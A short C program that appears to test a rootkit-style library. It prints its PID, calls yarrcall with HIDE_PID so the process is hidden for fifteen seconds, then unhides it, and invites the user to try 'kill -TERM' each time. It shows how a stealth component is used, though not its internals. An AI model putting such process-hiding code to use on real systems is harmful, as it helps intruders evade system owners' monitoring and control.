#define _GNU_SOURCE
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>

#include "yarrlib.h"

int main() {
    pid_t my_pid;
    YarrcallArgs_t args;
    long err;

    my_pid = getpid();
    printf("My pid is %d\n", my_pid);
    printf("Try with kill -TERM %d\n", my_pid);

    args.hidepid_args.pid = my_pid;
    err = yarrcall(HIDE_PID, &args);
    if (err) {
        printf("Errors hiding\n");
        return -1;
    }

    sleep(15);

    err = yarrcall(UNHIDE_PID, &args);
    if (err) {
        printf("Errors stop hiding\n");
    }

    printf("Try again with kill -TERM %d\n", my_pid);
    sleep(15);

    return 0;
}
